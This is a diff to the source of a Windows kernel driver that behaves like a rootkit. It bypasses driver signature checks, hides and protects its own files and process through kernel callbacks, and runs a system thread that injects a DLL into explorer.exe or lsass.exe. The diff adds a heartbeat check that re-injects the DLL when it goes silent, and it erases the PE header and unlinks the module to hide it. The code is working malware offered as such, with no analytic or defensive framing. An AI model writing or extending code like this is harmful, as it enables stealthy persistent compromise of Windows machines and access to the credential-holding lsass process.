@@ -8,73 +8,25 @@
 
 #define DELAY_ONE_MICROSECOND (-10)
 #define DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
+//#define TARGET_PNAME_1 "dllCaller.exe"
 #define TARGET_PNAME_1 "explorer.exe"
 #define TARGET_PNAME_2 "lsass.exe"
 #define TARGET_DLL_FOR_INJECT L"C:\\Windows\\vivohelper.dll"
 #define TARGET_SYS_TO_PROTECTED L"vivohelper.sys"
 #define TARGET_DLL_TO_PROTECTED L"vivohelper.dll"
-#define INJECT_SPLIT (60)
+#define INJECT_SPLIT (4*2) // second(s) 21600s = 360m = 6h = quater 
+#define HEART_BEAT_ADDRESS (0x1ff00)
 #define INVALID_PID (-1)
 
 #define _FILE_PROTECTION_WAY_1_
+#define _PROCESS_PROTECTION_
+#define _THREAD_INJECT_
+
 
 #ifdef _FILE_PROTECTION_WAY_1_
-#define DISTINCT_SAVEFILE_FROM_READ (0x0000009fL)
-#endif
-
-KEVENT kEvent;
-PVOID obHandle;
-NTKERNELAPI UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process);
-NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE Id, PEPROCESS *Process);
-
-/* file protection : second way */
-#ifdef _FILE_PROTECTION_WAY_2_
-#include <fltKernel.h>
-#include <dontuse.h>
-#include <suppress.h>
-#include <ntddscsi.h>
-#include <ntddk.h>
-#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "Not valid for kernel mode drivers")
-#endif
-/* file protection : second way ends */
-
-#define BYTE_PATTERN "%c%c%c%c%c%c%c%c %c%c%c%c%c%c%c%c %c%c%c%c%c%c%c%c %c%c%c%c%c%c%c%c"
-#define BYTE_BINARY(byte)  \
-  (byte & 0x80000000 ? '1' : '0'), \
-  (byte & 0x40000000 ? '1' : '0'), \
-  (byte & 0x20000000 ? '1' : '0'), \
-  (byte & 0x10000000 ? '1' : '0'), \
-  (byte & 0x08000000 ? '1' : '0'), \
-  (byte & 0x04000000 ? '1' : '0'), \
-  (byte & 0x02000000 ? '1' : '0'), \
-  (byte & 0x01000000 ? '1' : '0'), \
-  (byte & 0x800000 ? '1' : '0'), \
-  (byte & 0x400000 ? '1' : '0'), \
-  (byte & 0x200000 ? '1' : '0'), \
-  (byte & 0x100000 ? '1' : '0'), \
-  (byte & 0x080000 ? '1' : '0'), \
-  (byte & 0x040000 ? '1' : '0'), \
-  (byte & 0x020000 ? '1' : '0'), \
-  (byte & 0x010000 ? '1' : '0'), \
-  (byte & 0x8000 ? '1' : '0'), \
-  (byte & 0x4000 ? '1' : '0'), \
-  (byte & 0x2000 ? '1' : '0'), \
-  (byte & 0x1000 ? '1' : '0'), \
-  (byte & 0x0800 ? '1' : '0'), \
-  (byte & 0x0400 ? '1' : '0'), \
-  (byte & 0x0200 ? '1' : '0'), \
-  (byte & 0x0100 ? '1' : '0'), \
-  (byte & 0x80 ? '1' : '0'), \
-  (byte & 0x40 ? '1' : '0'), \
-  (byte & 0x20 ? '1' : '0'), \
-  (byte & 0x10 ? '1' : '0'), \
-  (byte & 0x08 ? '1' : '0'), \
-  (byte & 0x04 ? '1' : '0'), \
-  (byte & 0x02 ? '1' : '0'), \
-  (byte & 0x01 ? '1' : '0') 
-
 /* file protection : first way */
-#ifdef _FILE_PROTECTION_WAY_1_
+#define DISTINCT_SAVEFILE_FROM_READ (0x0000009fL)
+PVOID obHandle;
 typedef struct _CALLBACK_ENTRY {
 	LIST_ENTRY CallbackList;
 	OB_OPERATION  Operations;
@@ -326,11 +278,17 @@ VOID EnableObType(POBJECT_TYPE ObjectType)
 	PMY_OBJECT_TYPE myobtype = (PMY_OBJECT_TYPE)ObjectType;
 	myobtype->TypeInfo.SupportsObjectCallbacks = 1;
 }
-#endif
 /* file protection : first way ends */
+#endif
 
-/* file protection : second way */
 #ifdef _FILE_PROTECTION_WAY_2_
+/* file protection : second way */
+#include <fltKernel.h>
+#include <dontuse.h>
+#include <suppress.h>
+#include <ntddscsi.h>
+#include <ntddk.h>
+#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "Not valid for kernel mode drivers")
 NTSTATUS
 NPUnload
 (
@@ -708,11 +666,11 @@ FLT_PREOP_CALLBACK_STATUS NPPreWrite
 	}
 	return FLT_PREOP_SUCCESS_NO_CALLBACK;
 }
-#endif
 /* file protection : second way ends */
+#endif
 
+#ifdef _PROCESS_PROTECTION_
 /* process protection */
-
 NTKERNELAPI PEPROCESS IoThreadToProcess(PETHREAD Thread);
 NTKERNELAPI char* PsGetProcessImageFileName(PEPROCESS Process);
 
@@ -860,7 +818,17 @@ NTSTATUS ObProtectProcess(BOOLEAN Enable)
 	}
 }
 /* process protection ends */
+#endif
 
+#ifdef _THREAD_INJECT_
+KEVENT kEvent;
+NTKERNELAPI UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process);
+NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE Id, PEPROCESS *Process);
+typedef struct _DEVICE_EXTENSION {
+	KEVENT evKill;//在设备扩展中声明一个KEVENT对象  
+	PKTHREAD thread;
+}*PDEVICE_EXTENSION, DEVICE_EXTENSION;
+DEVICE_EXTENSION pdx;
 PEPROCESS LookupProcess(HANDLE Pid) {
 	PEPROCESS eprocess = NULL;
 	if (NT_SUCCESS(PsLookupProcessByProcessId(Pid, &eprocess))) {
@@ -900,21 +868,55 @@ VOID MyThreadFunc(IN PVOID context)
 	(void*)context;
 	NTSTATUS status = STATUS_SUCCESS;
 	INJECT_DLL data = { IT_Thread };
+	PROTECT_MEMORY in;
+	COPY_MEMORY cp;
+	ULONG timeStamp_old;
+	ULONG timeStamp_new;
+	ULONG last_pid;
 
+	
+	timeStamp_old = timeStamp_new = 0;
+
+	wcscpy_s(data.FullDllPath, 512, TARGET_DLL_FOR_INJECT);
+	wcscpy_s(data.initArg, 512, L"");
+	data.type = IT_Apc; // can't be IT_Thread nor IT_MMap
+	data.initRVA = 0;
+	data.wait = TRUE; // must be TRUE
+	data.unlink = TRUE;
+	data.erasePE = TRUE;
+
+	in.base = HEART_BEAT_ADDRESS;
+	in.size = sizeof(ULONG);
+	in.newProtection = PAGE_READWRITE;
+
+	cp.localbuf = &timeStamp_new;
+	cp.targetPtr = HEART_BEAT_ADDRESS;
+	cp.size = sizeof(ULONG);
+	cp.write = FALSE;
+
+	last_pid = GetPidByPName(TARGET_PNAME_1);
+	last_pid = last_pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : last_pid;
 	/*
 	*/
-	for (; ; ) {
-		wcscpy_s(data.FullDllPath, 512, TARGET_DLL_FOR_INJECT );
-		wcscpy_s(data.initArg, 512, L"");
-		data.type = IT_Apc;
+	for (;;) {
+		MySleep(INJECT_SPLIT * 1000);
 		data.pid = GetPidByPName(TARGET_PNAME_1);
 		data.pid = data.pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : data.pid;
-		data.initRVA = 0;
-		data.wait = TRUE;
-		data.unlink = TRUE;
-		data.erasePE = FALSE;
-		status = BBInjectDll(&data);
-		MySleep(INJECT_SPLIT * 1000);
+		DbgPrint("[+] data.pid [%d]\n", data.pid);
+		if (data.pid == INVALID_PID) continue;
+		if (data.pid != last_pid) { // pid changed
+			in.pid = data.pid;
+			BBProtectMemory(&in);
+		}
+		cp.pid = data.pid;
+		BBCopyMemory(&cp);
+		DbgPrint("[+] wassup time stamp old new [%d] [%d]\n", timeStamp_old, timeStamp_new);
+		if (timeStamp_old == timeStamp_new) { // heart not beating
+			status = BBInjectDll(&data);
+			DbgPrint("[+] return of inject [%d]\n", status);
+		}
+		timeStamp_old = timeStamp_new;
+		last_pid = data.pid;
 	}
 /*
 	*/
@@ -925,19 +927,22 @@ VOID MyThreadFunc(IN PVOID context)
 	PsTerminateSystemThread(STATUS_SUCCESS);
 	*/
 }
+#endif
 
 VOID _hijack(PDRIVER_OBJECT DriverObject) {
 	NTSTATUS status = STATUS_SUCCESS;
 	(void*)status;
 
 	// [+] ---------- process protection ----------
+#ifdef _PROCESS_PROTECTION_
 	BypassCheckSign(DriverObject);
 	ObProtectProcess(1);
+#endif
 	// [+] ---------- process protection ends ----------
 
 	// [+] ---------- file protection ----------
-	/* first way */
 #ifdef _FILE_PROTECTION_WAY_1_
+	/* first way */
 	OB_CALLBACK_REGISTRATION obReg;
 	OB_OPERATION_REGISTRATION opReg;
 	PLDR_DATA ldr;
@@ -956,11 +961,10 @@ VOID _hijack(PDRIVER_OBJECT DriverObject) {
 	opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
 	opReg.PreOperation = (POB_PRE_OPERATION_CALLBACK)&preCall;
 	status = ObRegisterCallbacks(&obReg, &obHandle);
-#endif
 	/* first way ends */
-	
-	/* second way */
+#endif
 #ifdef _FILE_PROTECTION_WAY_2_
+	/* second way */
 	PSECURITY_DESCRIPTOR sd;
 	OBJECT_ATTRIBUTES oa;
 	UNICODE_STRING uniString;		//for communication port name
@@ -985,16 +989,17 @@ _Exit_DriverEntry:
 			g_pFilterHandle = NULL;
 		}
 	}
-#endif
 	/* second way ends */
+#endif
 	// [+] ---------- file protection ends ----------
 
-	/*
-	MyThreadFunc((void*)0);
-	*/
+
 	// [+] ---------- Thread Inject ----------
+#ifdef _THREAD_INJECT_
+	//#if 0
 	HANDLE hThread;
-	KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
+	// KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
+	KeInitializeEvent(&pdx.evKill, NotificationEvent, FALSE);
 	status = PsCreateSystemThread(&hThread, 0, NULL, NULL, NULL, MyThreadFunc,
 		NULL);
 	if (!NT_SUCCESS(status))
@@ -1002,28 +1007,46 @@ _Exit_DriverEntry:
 		DbgPrint("PsCreateSystemThread failed!");
 		return;
 	}
+	ObReferenceObjectByHandle(hThread,        //为了等待线程终止，你需要KTHREAD对象的地址来代替从PsCreateSystemThread获得的线程句柄。  
+		THREAD_ALL_ACCESS,  //调用ObReferenceObjectByHandle获得这个地址。  
+		NULL,
+		KernelMode,
+		(PVOID*)&pdx.thread,
+		NULL);
 	ZwClose(hThread);
 	/*KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);*/
+#endif
 	// [+] ---------- Thread Inject ends ----------
 }
 
 VOID _hijack_Unload()
 {
-	/* file protection : first way  */
-#ifdef _FILE_PROTECTION_WAY_1_
-	ObUnRegisterCallbacks(obHandle);
+	// [+] ---------- Thread Inject ----------
+#ifdef _THREAD_INJECT_
+	KeSetEvent(&pdx.evKill, 0, FALSE);
+	KeWaitForSingleObject(pdx.thread, Executive, KernelMode, FALSE, NULL);
+	ObDereferenceObject(pdx.thread);
 #endif
-	/* file protection : first way ends */
+	// [+] ---------- Thread Inject ends ----------
 
-	/* file protection : second way  */
+	// [+] ---------- file protection ends ----------
 #ifdef _FILE_PROTECTION_WAY_2_
+	/* file protection : second way  */
 	PAGED_CODE();
 	FltUnregisterFilter(g_pFilterHandle);
 	DbgPrint("[MiniFilter][DriverUnload]\n");
-#endif
 	/* file protection : second way ends */
+#endif
+#ifdef _FILE_PROTECTION_WAY_1_
+	/* file protection : first way  */
+	ObUnRegisterCallbacks(obHandle);
+	/* file protection : first way ends */
+#endif
+	// [+] ---------- file protection ends ----------
 
+#ifdef _PROCESS_PROTECTION_
 	/* process protection */
 	ObProtectProcess(0);
 	/* process protection ends */
+#endif
 }
